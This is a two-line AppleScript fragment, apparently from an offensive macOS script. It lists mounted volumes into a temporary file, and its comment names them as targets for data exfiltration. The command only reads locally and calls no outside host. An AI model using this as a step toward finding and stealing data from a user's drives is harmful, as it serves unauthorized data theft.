-- Scans for external drives for potential exfil targets
do shell script "ls /Volumes > /tmp/volume_list.txt"
